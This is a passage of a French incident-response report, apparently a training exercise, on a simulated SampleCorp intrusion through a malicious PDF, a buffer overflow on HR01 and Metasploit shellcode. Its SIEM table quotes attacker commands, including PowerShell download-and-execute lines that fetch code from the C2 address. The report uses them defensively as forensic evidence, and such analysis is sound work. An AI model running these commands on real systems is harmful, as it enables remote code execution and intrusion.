id="1ea25200-7eb4-80d4-8886-d047a9d0211d"><td class="" id="?SjM">192.168.220.20</td><td class="" id="We&lt;A">DC01.samplecorp.com</td></tr><tr id="1ea25200-7eb4-80d7-aae0-c01b3c875cf7"><td class="" id="?SjM">192.168.220.200</td><td class="" id="We&lt;A">WKST01.samplecorp.com</td></tr><tr id="1ea25200-7eb4-8049-ae13-f1c38d2d4a90"><td class="" id="?SjM">192.168.220.101</td><td class="" id="We&lt;A">HR01.samplecorp.com</td></tr><tr id="1ea25200-7eb4-801b-a089-e95ce22d8248"><td class="" id="?SjM">192.168.220.202</td><td class="" id="We&lt;A">ENG01.samplecorp.com</td></tr></tbody></table><p class="" id="1ea25200-7eb4-80f4-8d10-c1c98d7387f1">Le tableau ci-dessous pr√©sente les r√©sultats d‚Äôune requ√™te SIEM visant √† identifier les ex√©cutions de commandes initi√©es depuis l‚Äôadresse <strong>192.168.220.66</strong>, sur la base des journaux collect√©s √† partir de <strong>WKST01.samplecorp.com</strong> :</p><table class="simple-table" id="1ea25200-7eb4-8072-8d09-ebb4ef29e91a"><tbody><tr id="1ea25200-7eb4-8043-8692-c9ad065b9c56"><td class="" id="_?m&lt;">Commande ex√©cut√©e</td><td class="" id="sXMe">H√¥te cible</td><td class="" id="L]\E">Nombre d‚Äôoccurrences</td></tr><tr id="1ea25200-7eb4-8079-8781-dbf6b18fb3de"><td class="" id="_?m&lt;"><code>cmd.exe /Q /c cd 1&gt; \\127.0.0.1\ADMIN$\1555864304.02 2&gt;&amp;1</code></td><td class="" id="sXMe">WKST01</td><td class="" id="L]\E">5</td></tr><tr id="1ea25200-7eb4-80b7-8f99-f90d7c11aebe"><td class="" id="_?m&lt;"><code>cmd.exe /Q /c dir 1&gt; \\127.0.0.1\ADMIN$\1555864304.02 2&gt;&amp;1</code></td><td class="" id="sXMe">WKST01</td><td class="" id="L]\E">4</td></tr><tr id="1ea25200-7eb4-8056-8107-dc02dbe8eeae"><td class="" id="_?m&lt;"><code>powershell.exe -nop -w hidden -c $c=new-object net.webclient;...;IEX</code></td><td class="" id="sXMe">WKST01</td><td class="" id="L]\E">2</td></tr><tr id="1ea25200-7eb4-80e6-ae48-dfce35183796"><td class="" id="_?m&lt;"><code>whoami</code></td><td class="" id="sXMe">WKST01</td><td class="" id="L]\E">1</td></tr><tr id="1ea25200-7eb4-80fe-b351-d834dff53127"><td class="" id="_?m&lt;"><code>powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.220.66/test.php'); $m = Get-ModifiableService;</code></td><td class="" id="sXMe">HR01</td><td class="" id="L]\E">1</td></tr></tbody></table><p class="" id="1ea25200-7eb4-80e8-89cb-c8af9a04ceed">Ces r√©sultats indiquent que l‚Äôentit√© non autoris√©e a r√©ussi √† infiltrer les syst√®mes <strong>WKST01.samplecorp.com</strong> et <strong>HR01.samplecorp.com</strong>.</p><p class="" id="1ea25200-7eb4-8031-8209-d081e9d5c4c8"><strong>HR01.samplecorp.com</strong></p><p class="" id="1ea25200-7eb4-802e-afe1-f7dd4ccc3d77">Une attention particuli√®re a ensuite √©t√© port√©e √† <strong>HR01.samplecorp.com</strong>, car les captures r√©seau montrent que l‚Äôadresse <strong>192.168.220.66</strong> a tent√© d‚Äô√©tablir une connexion avec ce syst√®me d√®s les premi√®res phases de l‚Äôactivit√© malveillante. Cela renforce l‚Äôhypoth√®se d‚Äôune compromission planifi√©e et coordonn√©e entre plusieurs h√¥tes internes.</p><figure class="image" id="1ea25200-7eb4-80cc-a1dd-dd64de7aa7d8"><a href="image%2011.png"><img src="image%2011.png" style="width:615.96875px"/></a></figure><p class="" id="1ea25200-7eb4-801d-8522-db483c40a804">Les d√©tails du trafic r√©seau indiquent une tentative d'exploitation par d√©passement de tampon ciblant le service actif sur le port <strong>31337</strong> de <strong>HR01.samplecorp.com</strong>.<br/><br/><br/></p><figure class="image" id="1ea25200-7eb4-8085-953f-eedb2fd73e75"><a href="image%2012.png"><img src="image%2012.png" style="width:615.96875px"/></a></figure></li></ul><p class="" id="1ea25200-7eb4-80f6-b0dc-f86159d56b4a"><br/>Le trafic r√©seau a √©t√© export√© sous forme de binaire brut pour une analyse plus approfondie.<br/><br/></p><figure class="image" id="1ea25200-7eb4-8078-95c9-e7307b81354b"><a href="image%2013.png"><img src="image%2013.png" style="width:643.984375px"/></a></figure><p class="" id="1ea25200-7eb4-8006-805e-cba3214842b9">Le binaire extrait a √©t√© analys√© dans un d√©bogueur de shellcode, scdbg.</p><p class="" id="1ea25200-7eb4-8088-8dc6-c346149412b5">Scdbg r√©v√®le que le shellcode tentera d'√©tablir une connexion √† 192.168.220.66 sur le port 4444. Cela confirme une tentative d'exploitation d'un service ex√©cut√© sur le port 31337 de <a href="http://hr01.samplecorp.com/">HR01.samplecorp.com</a>.<br/></p><figure class="image" id="1ea25200-7eb4-8033-ba6f-fd23db188dfa"><a href="image%2014.png"><img src="image%2014.png" style="width:587.984375px"/></a></figure><p class="" id="1ea25200-7eb4-80b6-b28b-fce58365318b">Une recherche de connexions r√©seau entre <a href="http://hr01.samplecorp.com/">HR01.samplecorp.com</a> et l'entit√© non autoris√©e a √©t√© effectu√©e √† l'aide du fichier de capture de trafic susmentionn√©. Les r√©sultats ont r√©v√©l√© des connexions vers l'entit√© non autoris√©e sur le port 4444. Cela indique que l'entit√© non autoris√©e a exploit√© avec succ√®s une vuln√©rabilit√© de d√©passement de m√©moire tampon pour obtenir l'ex√©cution de commandes sur <a href="http://hr01.samplecorp.com/">HR01.samplecorp.com</a>.</p><figure class="image" id="1ea25200-7eb4-80e6-930d-d97c57f2540c"><a href="image%2015.png"><img src="image%2015.png" style="width:587.96875px"/></a></figure><h3 class="" id="1ea25200-7eb4-8004-9e3e-dde6a91b565f"><strong>Adaptation de la profondeur de l‚Äôanalyse technique</strong></h3><p class="" id="1ea25200-7eb4-80d9-9c8b-f5ba06e90eb4">La profondeur de l‚Äôanalyse technique peut √™tre ajust√©e afin de garantir que l‚Äôensemble des parties prenantes soient correctement inform√©es de l‚Äôincident et des mesures prises en r√©ponse. Bien que nous ayons volontairement condens√© les d√©tails de l‚Äôenqu√™te dans ce module afin de ne pas vous submerger, il est important de noter que, dans un contexte r√©el, chaque affirmation serait √©tay√©e par des preuves solides et v√©rifiables.</p><hr id="1ea25200-7eb4-8099-a292-ca451f5deaa7"/><h3 class="" id="1ea25200-7eb4-80b8-920e-e48ffe25a2f4"><strong>Indicateurs de Compromission (IoCs)</strong></h3><ul class="bulleted-list" id="1ea25200-7eb4-80ad-b1cd-c0a84372449e"><li style="list-style-type:disc"><strong>Adresse IP de Command &amp; Control (C2)</strong> : 192.168.220.66</li></ul><ul class="bulleted-list" id="1ea25200-7eb4-80d1-a402-daa83ec68d65"><li style="list-style-type:disc"><strong>Fichier malveillant</strong> : <code>cv.pdf</code><ul class="bulleted-list" id="1ea25200-7eb4-8009-85a6-d6ab0c5de649"><li style="list-style-type:circle"><strong>Empreinte SHA256</strong> : <code>ef59d7038cfd565fd65bae12588810d5361df938244ebad33b71882dcf683011</code></li></ul></li></ul><hr id="1ea25200-7eb4-8055-a9bd-efe0e23b43ad"/><h3 class="" id="1ea25200-7eb4-805a-ba08-fdaddb3f3133"><strong>Analyse des Causes Racines</strong></h3><p class="" id="1ea25200-7eb4-80eb-aac6-ffe3a2b146cd">L'acc√®s non autoris√© au r√©seau interne de SampleCorp a √©t√© rendu possible par l'absence de contr√¥les d‚Äôacc√®s r√©seau ad√©quats.</p><p class="" id="1ea25200-7eb4-8062-8ee3-d9961e577f79">Deux vuln√©rabilit√©s majeures ont √©t√© identifi√©es comme causes principales de l‚Äôincident :</p><ol class="numbered-list" id="1ea25200-7eb4-80d2-9eac-fc5b490bb530" start="1" type="1"><li><strong>Utilisation d‚Äôune version obsol√®te d‚ÄôAdobe Acrobat Reader</strong>, connue pour ses failles de s√©curit√©.</li></ol><ol class="numbered-list" id="1ea25200-7eb4-8038-afee-ea80eda9f333" start="2" type="1"><li><strong>Pr√©sence d‚Äôune vuln√©rabilit√© de type d√©passement de tampon</strong> dans une application propri√©taire.</li></ol><p class="" id="1ea25200-7eb4-80fb-95a2-e3fe63e031bc">Ces failles ont √©t√© aggrav√©es par un manque de cloisonnement r√©seau entre les syst√®mes critiques, facilitant la propagation de l‚Äôattaque. En parall√®le, l‚Äôabsence de formation des utilisateurs face aux techniques de phishing a √©galement √©t√© un facteur de compromission.</p><hr id="1ea25200-7eb4-80a2-8b23-f80b6bd5c612"/><h3 class="" id="1ea25200-7eb4-8002-bca8-c32d2ab47867"><strong>Chronologie Technique de l‚ÄôIncident</strong></h3><h3 class="" id="1ea25200-7eb4-8053-8523-ee150b7dda72"><strong>Compromission initiale</strong></h3><ul class="bulleted-list" id="1ea25200-7eb4-8065-8439-de416d5e600a"><li style="list-style-type:disc"><strong>22 avril 2019, 00:27:27</strong> : Un employ√© ouvre le fichier malveillant <code>cv.pdf</code> sur <strong>WKST01.samplecorp.com</strong>, exploitant une vuln√©rabilit√© dans une version obsol√®te d‚ÄôAcrobat Reader. Cela d√©clenche l‚Äôex√©cution d‚Äôun code malveillant qui permet une premi√®re prise de contr√¥le.</li></ul><h3 class="" id="1ea25200-7eb4-809f-bb20-efe941d10fd8"><strong>Mouvement lat√©ral</strong></h3><ul class="bulleted-list" id="1ea25200-7eb4-80b7-ba35-c420aa15f16a"><li style="list-style-type:disc"><strong>22 avril 2019, 00:50:18</strong> : L‚Äôentit√© malveillante r√©alise une reconnaissance du r√©seau interne. Elle identifie une vuln√©rabilit√© de type buffer overflow dans une application RH propri√©taire sur <strong>HR01.samplecorp.com</strong> et l‚Äôexploite pour acc√©der √† ce syst√®me.</li></ul><h3 class="" id="1ea25200-7eb4-80f3-b740-e2a71078bff2"><strong>Acc√®s aux donn√©es &amp; exfiltration</strong></h3><ul class="bulleted-list" id="1ea25200-7eb4-80ce-ab39-d7e3c3e6255d"><li style="list-style-type:disc"><strong>22 avril 2019, 00:35:09</strong> : L‚Äôintrus acc√®de √† plusieurs r√©pertoires sur <strong>WKST01</strong> contenant du code source propri√©taire et des cl√©s API.</li></ul><ul class="bulleted-list" id="1ea25200-7eb4-800a-ab6e-c07c45627bd4"><li style="list-style-type:disc"><strong>22 avril 2019, 01:30:12</strong> : Il d√©couvre une base de donn√©es non chiffr√©e sur <strong>HR01</strong> contenant des donn√©es sensibles (NIR, salaires, etc.), qu‚Äôil compresse puis exfiltre vers un serveur externe via un tunnel SSH s√©curis√©.</li></ul><h3 class="" id="1ea25200-7eb4-80db-bb29-d1622d350a2f"><strong>Communications avec le serveur C2</strong></h3><ul class="bulleted-list" id="1ea25200-7eb4-8003-b7d9-f47706976fee"><li style="list-style-type:disc">L‚Äôentit√© malveillante a obtenu un acc√®s physique au r√©seau interne. Le serveur de commande et de contr√¥le (C2) identifi√© utilisait l‚Äôadresse IP interne <strong>192.168.220.66</strong>.</li></ul><h3 class="" id="1ea25200-7eb4-80f6-bece-f9a8fcabea65"><strong>D√©ploiement ou activit√© de logiciels malveillants</strong></h3><ul class="bulleted-list" id="1ea25200-7eb4-8095-a956-d8306d4217f1"><li style="list-style-type:disc">Le malware a √©t√© diffus√© via un fichier PDF malveillant et a utilis√© des binaires Windows l√©gitimes pour l‚Äôex√©cution de commandes et l‚Äôexploitation post-compromission.</li></ul><ul class="bulleted-list" id="1ea25200-7eb4-807b-a128-d10f60844478"><li style="list-style-type:disc">Du code shell (shellcode) a ensuite √©t√© inject√© dans le cadre du buffer overflow pour infecter <strong>HR01.samplecorp.com</strong>.</li></ul><hr id="1ea25200-7eb4-80d4-8fd7-e8fcf1b951cf"/><h3 class="" id="1ea25200-7eb4-8098-a6db-d8a9385ddb4c"><strong>Phases de Contention</strong></h3><ul class="bulleted-list" id="1ea25200-7eb4-8032-8446-e26ef8537337"><li style="list-style-type:disc"><strong>22 avril 2019, 02:30:11</strong> : Les √©quipes SOC et DFIR isolent imm√©diatement les machines <strong>WKST01</strong> et <strong>HR01</strong> via segmentation VLAN.</li></ul><ul class="bulleted-list" id="1ea25200-7eb4-8058-99bd-f97f5fdfcb90"><li style="list-style-type:disc"><strong>03:10:14</strong> : Installation d‚Äôune solution de s√©curit√© sur les deux h√¥tes pour collecter davantage de donn√©es.</li></ul><ul class="bulleted-list" id="1ea25200-7eb4-80d6-b39c-d0c89ea1be49"><li style="list-style-type:disc"><strong>03:43:34</strong> : Mise √† jour des r√®gles du pare-feu pour bloquer l‚ÄôIP C2 identifi√©e et couper l‚Äôacc√®s distant de l‚Äôattaquant.</li></ul><hr id="1ea25200-7eb4-80b2-b651-f7c26d48b3ad"/><h3 class="" id="1ea25200-7eb4-80a8-8351-d0be54327de1"><strong>Phases d‚Äô√âradication</strong></h3><ul class="bulleted-list" id="1ea25200-7eb4-804b-bd49-c42043c45954"><li style="list-style-type:disc"><strong>04:11:00</strong> : Utilisation d‚Äôun outil sp√©cialis√© de suppression de malware sur <strong>WKST01</strong> et <strong>HR01</strong>.</li></ul><ul class="bulleted-list" id="1ea25200-7eb4-8038-b53f-d50a63b6927c"><li style="list-style-type:disc"><strong>04:30:00</strong> : Mise √† jour d‚ÄôAcrobat Reader sur toutes les machines concern√©es pour corriger la vuln√©rabilit√© initiale.</li></ul><ul class="bulleted-list" id="1ea25200-7eb4-8059-beb9-f6b6d5e806e5"><li style="list-style-type:disc"><strong>05:01:08</strong> : R√©vocation des cl√©s API compromises.</li></ul><ul class="bulleted-list" id="1ea25200-7eb4-8004-9622-d4ea67ba6935"><li style="list-style-type:disc"><strong>05:05:08</strong> : R√©initialisation des identifiants des utilisateurs concern√©s.</li></ul><hr id="1ea25200-7eb4-8050-9720-e4758602ead2"/><h3 class="" id="1ea25200-7eb4-805e-b1ad-e3af9c386d10"><strong>Phases de R√©tablissement</strong></h3><ul class="bulleted-list" id="1ea25200-7eb4-8089-a024-d15a02a543f3"><li style="list-style-type:disc"><strong>05:21:20</strong> : Restauration de <strong>WKST01</strong> √† partir d‚Äôune sauvegarde valid√©e.</li></ul><ul class="bulleted-list" id="1ea25200-7eb4-80e0-94b4-c300bea78697"><li style="list-style-type:disc"><strong>05:58:50</strong> : Restauration de <strong>HR01</strong> suivant la m√™me proc√©dure.</li></ul><ul class="bulleted-list" id="1ea25200-7eb4-8037-96a0-f0ce1397a93b"><li style="list-style-type:disc"><strong>06:33:44</strong> : D√©ploiement d‚Äôun correctif d‚Äôurgence sur l‚Äôapplication RH pour combler la vuln√©rabilit√© de type buffer overflow.</li></ul><hr id="1ea25200-7eb4-802f-b290-c9b812a0466d"/><h3 class="" id="1ea25200-7eb4-8079-9cf8-d4c2122a1342"><strong>Nature de l‚ÄôAttaque</strong></h3><p class="" id="1ea25200-7eb4-809e-9e25-f942b9235bae">Cette section vise √† examiner en d√©tail le mode op√©ratoire de l‚Äôacteur malveillant, en analysant les tactiques, techniques et proc√©dures (TTPs) utilis√©es tout au long de l‚Äôintrusion. Par exemple, nous avons √©tudi√© la mani√®re dont l‚Äô√©quipe SOC a pu d√©terminer que l‚Äôentit√© non autoris√©e avait recours au <strong>framework Metasploit</strong>.</p><hr id="1ea25200-7eb4-8004-9c36-fca445f1bf45"/><h3 class="" id="1ea25200-7eb4-807e-bbd9-f1164be834ff"><strong>D√©tection de Metasploit</strong></h3><p class="" id="1ea25200-7eb4-80eb-97f2-f4f7ebb69df0">Pour mieux comprendre les m√©thodes employ√©es, une attention particuli√®re a √©t√© port√©e sur les commandes <strong>PowerShell</strong> malveillantes ex√©cut√©es, notamment celle visible dans la capture d‚Äô√©cran suivante.</p><figure class="image" id="1ea25200-7eb4-8048-9b59-eb6bc35e38de"><a href="image%2016.png"><img src="image%2016.png" style="width:587.984375px"/></a></figure><p class="" id="1ea25200-7eb4-805c-bcc7-ffb51ac1db12">Apr√®s inspection, il est apparu clairement qu'un double codage avait √©t√© utilis√©, probablement pour contourner les m√©canismes de d√©tection. L'√©quipe SOC a r√©ussi √† d√©coder la charge utile malveillante, r√©v√©lant le code PowerShell exact ex√©cut√© dans la m√©moire de <a href="http://wkst01.samplecorp.com/">WKST01.samplecorp.com</a>.</p><figure class="image" id="1ea25200-7eb4-8040-84a8-dfe1ec2f7dc9"><a href="image%2017.png"><img src="image%2017.png" style="width:587.96875px"/></a></figure><p class="" id="1ea25200-7eb4-8083-b844-c673f66f0918">En exploitant les renseignements open source, notre √©quipe SOC a d√©termin√© que ce code PowerShell est probablement li√© au framework de post-exploitation Metasploit.</p><figure class="image" id="1ea25200-7eb4-8045-b289-eaa941e83605"><a href="image%2018.png"><img src="image%2018.png" style="width:3791px"/></a></figure><p class="" id="1ea25200-7eb4-8061-9a3b-ce0a0539b94b">Pour √©tayer notre hypoth√®se d'utilisation de Metasploit, nous avons analys√© en profondeur le shellcode d√©tect√©. Nous avons export√© les octets du paquet contenant le shellcode (au format .bin) et les avons ensuite soumis √† VirusTotal pour √©valuation.</p><figure class="image" id="1ea25200-7eb4-8058-a222-d86bf7e1440c"><a href="image%2019.png"><img src="image%2019.png" style="width:587.984375px"/></a></figure><figure class="image" id="1ea25200-7eb4-80ee-a222-f28307fda4ce"><a href="image%2020.png"><img src="image%2020.png" style="width:413.984375px"/></a></figure><figure class="image" id="1ea25200-7eb4-8002-959e-f9b959c15f6b"><a href="image%2021.png"><img src="image%2021.png" style="width:587.984375px"/></a></figure><h3 class="" id="1ea25200-7eb4-80af-9522-d579c1cf7f71"><strong>Confirmation de l‚Äôutilisation de Metasploit</strong></h3><p class="" id="1ea25200-7eb4-8064-9fae-f2b85347f578">Les r√©sultats fournis par <strong>VirusTotal</strong> ont confirm√© nos soup√ßons concernant l‚Äôusage de <strong>Metasploit</strong>. Les artefacts tels que <code>metacoder</code> et <code>shikata</code>, d√©tect√©s dans les charges utiles, sont intrins√®quement li√©s au shellcode g√©n√©r√© par ce framework de post-exploitation.</p><hr id="1ea25200-7eb4-804b-bf31-c6ccc28f11d1"/><h3 class="" id="1ea25200-7eb4-80ad-bc2b-c9b9639e8e6a"><strong>Analyse de l'Impact</strong></h3><p class="" id="1ea25200-7eb4-80b0-aef3-e49fc8f3b212">Dans cette section, une analyse approfondie des impacts sur les parties prenantes est essentielle, en tenant compte de la structure interne sp√©cifique de l‚Äôentreprise, de son environnement commercial et de ses obligations r√©glementaires. Cette √©valuation vise √† cerner les r√©percussions de l‚Äôincident sur toutes les entit√©s concern√©es.</p><hr id="1ea25200-7eb4-8099-a6bd-ee96703ef153"/><h3 class="" id="1ea25200-7eb4-80e7-b31a-e0336bbe4044"><strong>Analyse de la R√©ponse et de la R√©cup√©ration</strong></h3><h3 class="" id="1ea25200-7eb4-8096-bbe2-d8ad37206e55"><strong>Mesures de R√©ponse Imm√©diate</strong></h3><p class="" id="1ea25200-7eb4-80a9-ac5c-fb59cf1f29f9"><strong>R√©vocation des Acc√®s :</strong></p><ul class="bulleted-list" id="1ea25200-7eb4-800e-9b8e-e3ea052c0eaa"><li style="list-style-type:disc"><strong>Identification des syst√®mes et comptes compromis :</strong> Gr√¢ce √† la solution SIEM d‚ÄôElastic, des activit√©s suspectes ont √©t√© d√©tect√©es sur <strong>WKST01.samplecorp.com</strong>. Une analyse des journaux et du trafic r√©seau a ensuite r√©v√©l√© une compromission de <strong>HR01.samplecorp.com</strong>.</li></ul><ul class="bulleted-list" id="1ea25200-7eb4-8000-bc86-f94d7e6e42db"><li style="list-style-type:disc"><strong>P√©riode :</strong> Les activit√©s malveillantes ont √©t√© d√©tect√©es le <strong>22 avril 2019 √† 01:05:00</strong>. L‚Äôacc√®s a √©t√© r√©voqu√© √† <strong>03:43:34</strong>, suite √† la mise √† jour des r√®gles du pare-feu bloquant l‚ÄôIP du serveur C2.</li></ul><ul class="bulleted-list" id="1ea25200-7eb4-804d-a0d5-cfd947df5841"><li style="list-style-type:disc"><strong>M√©thode de r√©vocation :</strong> En compl√©ment du blocage via pare-feu, des politiques Active Directory ont √©t√© mises en ≈ìuvre pour forcer la d√©connexion des sessions suspectes. Les identifiants utilisateurs compromis ont √©t√© r√©initialis√©s et les cl√©s API concern√©es ont √©t√© r√©voqu√©es.</li></ul><ul class="bulleted-list" id="1ea25200-7eb4-80ff-a962-c55e8fc0d911"><li style="list-style-type:disc"><strong>Impact :</strong> Cette action rapide a permis d‚Äôarr√™ter tout mouvement lat√©ral potentiel et de pr√©venir une compromission plus √©tendue.</li></ul><h3 class="" id="1ea25200-7eb4-80b5-8201-c0671400c0bd"><strong>Strat√©gie de Confinement</strong></h3><ul class="bulleted-list" id="1ea25200-7eb4-807c-a9bc-cfdaf06ed9a4"><li style="list-style-type:disc"><strong>Mesures √† court terme :</strong> Une segmentation VLAN a √©t√© imm√©diatement appliqu√©e pour isoler les h√¥tes compromis (<strong>WKST01</strong> et <strong>HR01</strong>) du reste du r√©seau, limitant ainsi la propagation de l‚Äôattaque.</li></ul><ul class="bulleted-list" id="1ea25200-7eb4-803e-a5c4-fa67efd9c780"><li style="list-style-type:disc"><strong>Mesures √† long terme :</strong> Des plans ont √©t√© √©tablis pour renforcer la segmentation r√©seau, en cloisonnant les services critiques et en limitant l'acc√®s aux seuls √©quipements autoris√©s.</li></ul><ul class="bulleted-list" id="1ea25200-7eb4-808d-b0b4-c1c94730de77"><li style="list-style-type:disc"><strong>Efficacit√© :</strong> La strat√©gie a √©t√© efficace, emp√™chant toute √©l√©vation de privil√®ge ou mouvement vers d'autres syst√®mes.</li></ul><h3 class="" id="1ea25200-7eb4-8057-9f56-c7ae715ddd3c"><strong>Mesures d'√âradication</strong></h3><p class="" id="1ea25200-7eb4-809d-878e-c7de770d7aa1"><strong>Suppression du Malware :</strong></p><ul class="bulleted-list" id="1ea25200-7eb4-8023-aab8-f36d2d9eac6a"><li style="list-style-type:disc"><strong>Identification :</strong> Des processus suspects ont √©t√© d√©tect√©s sur les h√¥tes infect√©s. L‚Äôanalyse forensique a r√©v√©l√© la pr√©sence de composants typiques de Metasploit, confirm√©e par VirusTotal.</li></ul><ul class="bulleted-list" id="1ea25200-7eb4-8004-9a53-f0b87b7d0815"><li style="list-style-type:disc"><strong>Suppression :</strong> Un outil sp√©cialis√© a √©t√© utilis√© pour √©radiquer toutes les charges malveillantes identifi√©es sur <strong>WKST01</strong> et <strong>HR01</strong>.</li></ul><ul class="bulleted-list" id="1ea25200-7eb4-80cd-8c50-f12ca173390c"><li style="list-style-type:disc"><strong>V√©rification :</strong> Des analyses suppl√©mentaires, incluant des m√©thodes heuristiques, ont √©t√© men√©es pour s‚Äôassurer de l‚Äôabsence de r√©sidus malveillants.</li></ul><p class="" id="1ea25200-7eb4-80ba-8930-cf96647eabf6"><strong>Mise √† jour des Syst√®mes :</strong></p><ul class="bulleted-list" id="1ea25200-7eb4-80b1-8768-fa634176c033"><li style="list-style-type:disc"><strong>Identification des vuln√©rabilit√©s :</strong> Deux vuln√©rabilit√©s ont √©t√© exploit√©es : une faille connue dans une version obsol√®te d‚ÄôAcrobat Reader et un <strong>buffer overflow</strong> dans une application RH propri√©taire.</li></ul><ul class="bulleted-list" id="1ea25200-7eb4-80bc-a29d-d93a68dd3f5b"><li style="list-style-type:disc"><strong>Gestion des correctifs :</strong> Acrobat Reader a √©t√© mis √† jour sur tous les postes. Un patch d'urgence a √©galement √©t√© d√©velopp√© et d√©ploy√© sur l‚Äôapplication RH vuln√©rable (<strong>HR01</strong>).</li></ul><ul class="bulleted-list" id="1ea25200-7eb4-808e-841f-cab6ad2cdc48"><li style="list-style-type:disc"><strong>Proc√©dures de repli :</strong> Des sauvegardes syst√®me ont √©t√© r√©alis√©es avant chaque mise √† jour pour permettre un retour rapide en cas d‚Äôinstabilit√©.</li></ul><hr id="1ea25200-7eb4-8027-a281-e72bb1fcea33"/><h3 class="" id="1ea25200-7eb4-80f7-b9ae-db4d24d1c011"><strong>√âtapes de R√©cup√©ration</strong></h3><p class="" id="1ea25200-7eb4-80cf-8f11-eb2558ab6fd1"><strong>Restauration des Donn√©es :</strong></p><ul class="bulleted-list" id="1ea25200-7eb4-8065-bb23-f770df740e95"><li style="list-style-type:disc"><strong>Validation des sauvegardes :</strong> Des contr√¥les d‚Äôint√©grit√© ont √©t√© r√©alis√©s via comparaison de checksums avant toute restauration.</li></ul><ul class="bulleted-list" id="1ea25200-7eb4-80a7-b608-f7575ab62607"><li style="list-style-type:disc"><strong>Processus de restauration :</strong> Les syst√®mes ont √©t√© restaur√©s √† partir de sauvegardes valid√©es par l‚Äô√©quipe SOC.</li></ul><ul class="bulleted-list" id="1ea25200-7eb4-80e7-b920-c89e0f9c9555"><li style="list-style-type:disc"><strong>V√©rification de l‚Äôint√©grit√© :</strong> Des hachages cryptographiques (SHA-256) ont √©t√© g√©n√©r√©s pour s'assurer de l'authenticit√© des donn√©es restaur√©es.</li></ul><p class="" id="1ea25200-7eb4-806e-af21-c42afe8f3109"><strong>Validation des Syst√®mes :</strong></p><ul class="bulleted-list" id="1ea25200-7eb4-807f-a041-d10bfec40d93"><li style="list-style-type:disc"><strong>Mesures de s√©curit√© :</strong> Les pare-feux et les syst√®mes de d√©tection d‚Äôintrusion ont √©t√© mis √† jour avec les derniers IoCs identifi√©s.</li></ul><ul class="bulleted-list" id="1ea25200-7eb4-8025-b030-d0307ce08886"><li style="list-style-type:disc"><strong>Tests op√©rationnels :</strong> Avant la remise en production, des tests de charge et de stabilit√© ont √©t√© r√©alis√©s.</li></ul><hr id="1ea25200-7eb4-80fe-8328-c22f33c42eff"/><h3 class="" id="1ea25200-7eb4-8061-9595-d3cb205a5710"><strong>Actions Post-Incident</strong></h3><p class="" id="1ea25200-7eb4-8077-8fbd-da9ef3853cbc"><strong>Surveillance Renforc√©e :</strong></p><ul class="bulleted-list" id="1ea25200-7eb4-806a-99a2-f73c7ebe72ec"><li style="list-style-type:disc"><strong>Nouveau plan de supervision :</strong> Mise en place d‚Äôune surveillance comportementale visant √† d√©tecter toute anomalie par rapport √† un profil d‚Äôactivit√© normal.</li></ul><ul class="bulleted-list" id="1ea25200-7eb4-8024-b6da-d3417d3d7cba"><li style="list-style-type:disc"><strong>Outils utilis√©s :</strong> Le SIEM Elastic sera configur√© avec de nouvelles r√®gles de corr√©lation pour identifier les TTPs associ√©s √† cet incident.</li></ul><p class="" id="1ea25200-7eb4-8058-87a5-c146a66b8d42"><strong>Retour d‚ÄôExp√©rience :</strong></p><ul class="bulleted-list" id="1ea25200-7eb4-8061-a482-f4646d8006e3"><li style="list-style-type:disc"><strong>Analyse des lacunes :</strong> L‚Äôincident a mis en lumi√®re des faiblesses concernant les contr√¥les d'acc√®s, le filtrage des e-mails, la segmentation r√©seau et la sensibilisation aux attaques par hame√ßonnage.</li></ul><ul class="bulleted-list" id="1ea25200-7eb4-8006-a655-fd6840a482db"><li style="list-style-type:disc"><strong>Recommandations :</strong> Prioriser la gestion des actifs, le filtrage des courriels et le renforcement de la formation √† la cybers√©curit√©.</li></ul><ul class="bulleted-list" id="1ea25200-7eb4-80b0-99d7-f277f6a467ee"><li style="list-style-type:disc"><strong>Strat√©gie future :</strong> Adopter une approche <strong>Zero Trust</strong>, segmenter plus finement le r√©seau, et investir davantage dans la formation et les outils de protection pr√©ventive.</li></ul><hr id="1ea25200-7eb4-8075-9131-f88bee23072c"/><h3 class="" id="1ea25200-7eb4-80bc-a079-c45c90aed985"><strong>Annexe A ‚Äì Chronologie Technique</strong></h3><table class="simple-table" id="1ea25200-7eb4-8022-8795-d012c3544d5e"><tbody><tr id="1ea25200-7eb4-8049-8aab-cd02ce8eec8e"><td class="" id="m@N\">Heure</td><td class="" id="LSbD">√âv√©nement</td></tr><tr id="1ea25200-7eb4-808c-9dd4-e805eebf55d5"><td class="" id="m@N\">22 avril 2019, 00:27:27</td><td class="" id="LSbD">Un employ√© ouvre un fichier PDF malveillant (<code>cv.pdf</code>) sur <strong>WKST01</strong>, exploitant une faille Acrobat Reader. Une charge utile s'ex√©cute, √©tablissant un premier point d‚Äôancrage.</td></tr><tr id="1ea25200-7eb4-8033-bc10-cd841b96ff77"><td class="" id="m@N\">22 avril 2019, 00:35:09</td><td class="" id="LSbD">Acc√®s non autoris√© √† des r√©pertoires contenant du code source et des cl√©s API.</td></tr><tr id="1ea25200-7eb4-80d7-8728-d6d6ad77244a"><td class="" id="m@N\">22 avril 2019, 00:50:18</td><td class="" id="LSbD">L‚Äôattaquant effectue une reconnaissance et identifie un buffer overflow dans l‚Äôapplication RH de <strong>HR01</strong>, qu‚Äôil exploite.</td></tr><tr id="1ea25200-7eb4-8010-86fb-d88ee2d347e7"><td class="" id="m@N\">22 avril 2019, 01:30:12</td><td class="" id="LSbD">Acc√®s √† une base de donn√©es non chiffr√©e contenant des donn√©es sensibles, exfiltr√©es via un tunnel SSH.</td></tr><tr id="1ea25200-7eb4-804f-b37e-cf30c9874148"><td class="" id="m@N\">22 avril 2019, 02:30:11</td><td class="" id="LSbD">Isolement de <strong>WKST01</strong> et <strong>HR01</strong> via segmentation VLAN.</td></tr><tr id="1ea25200-7eb4-804f-a8b1-ff01eb635e37"><td class="" id="m@N\">22 avril 2019, 03:10:14</td><td class="" id="LSbD">D√©ploiement de solutions de s√©curit√© pour collecter plus d‚Äôinformations sur les h√¥tes compromis.</td></tr><tr id="1ea25200-7eb4-80b4-baea-e9294ce2f4df"><td class="" id="m@N\">22 avril 2019, 03:43:34</td><td class="" id="LSbD">Blocage de l‚ÄôIP C2 via les r√®gles du pare-feu.</td></tr><tr id="1ea25200-7eb4-80e1-8a75-fac7f995f57e"><td class="" id="m@N\">22 avril 2019, 04:11:00</td><td class="" id="LSbD">Suppression du malware avec un outil sp√©cialis√©.</td></tr><tr id="1ea25200-7eb4-80a0-8c0f-ce16d39448bd"><td class="" id="m@N\">22 avril 2019, 04:30:00</td><td class="" 